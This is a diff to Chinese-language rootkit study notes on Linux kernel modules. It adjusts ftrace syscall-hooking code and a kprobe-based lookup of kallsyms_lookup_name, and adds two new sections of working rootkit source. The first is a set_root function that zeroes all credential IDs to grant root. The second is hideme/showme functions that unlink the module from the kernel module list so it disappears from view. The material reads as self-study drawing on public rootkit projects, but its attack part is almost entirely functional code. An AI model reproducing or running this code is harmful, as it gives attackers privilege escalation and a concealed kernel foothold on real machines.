@@ -80,6 +80,8 @@ asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
 
 # kallsyms_lookup_name地址获取
 
+通过kprobe获取kallsyms_lookup_name函数地址
+
 ```c
 /// kallsyms_lookup_name
 #include <linux/kprobes.h>
@@ -159,7 +161,8 @@ asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
 
 /// kallsyms_lookup_name
 static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name"};
+    .symbol_name = "kallsyms_lookup_name"
+};
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;
 static void* init_ksymbol(void)
@@ -186,7 +189,7 @@ static void* init_ksymbol(void)
 
 #define HOOK(_name, _hook, _orig)   \
 {                   \
-    .name = SYSCALL_NAME(_name),        \
+    .name = (_name),        \
     .function = (_hook),        \
     .original = (_orig),        \
 }
@@ -200,7 +203,7 @@ static void* init_ksymbol(void)
  * need the use of the $rip register in our hook, so we have to disable this
  * protection and implement our own).
  * */
-#define USE_FENTRY_OFFSET 0
+#define USE_FENTRY_OFFSET 1
 #if !USE_FENTRY_OFFSET
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 #endif
@@ -348,7 +351,7 @@ void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
 }
 
 static struct ftrace_hook hooks[] = {
-	HOOK("sys_mkdir",hook_mkdir,&orig_mkdir),
+	HOOK(SYSCALL_NAME("sys_mkdir"),hook_mkdir,&orig_mkdir),
 };
 
 static int __init example_init(void)
@@ -379,6 +382,67 @@ MODULE_LICENSE("GPL");
 
 ```
 
+# root权限提升
+
+```c
+void set_root(void)
+{
+    struct cred *root;
+    root = prepare_creds();
+
+    if(root == NULL)
+        return ;
+
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+    
+    commit_creds(root);
+}
+```
+
+# 模块隐藏
+
+```c
+void hideme(void)
+{
+    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
+    if(module_mutex == NULL){
+        printk("rootkit:get module_mutex addr error\n");
+        return;
+    }
+
+    mutex_lock(module_mutex);
+
+    list_del(&THIS_MODULE->list);
+
+    mutex_unlock(module_mutex);
+
+}
+
+void showme(void)
+{
+    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
+    struct list_head *modules = (struct list_head*)my_kallsyms_lookup_name("modules");
+
+    if(module_mutex == NULL){
+        printk("rootkit:get module_mutex addr error\n");
+        return;
+    }
+    if(modules == NULL){
+        printk("rootkit:get modules addr error\n");
+        return;
+    }
+
+    mutex_lock(module_mutex);
+
+    list_add(&THIS_MODULE->list,modules);
+
+    mutex_unlock(module_mutex);
+}
+```
+
 
 
 # 参考资料
@@ -402,3 +466,5 @@ https://github.com/m0nad/Diamorphine
 Linux Rootkits Part 1: Introduction and Workflow
 
 https://xcellerator.github.io/posts/linux_rootkits_01/
+
+https://xcellerator.github.io/tags/rootkit/
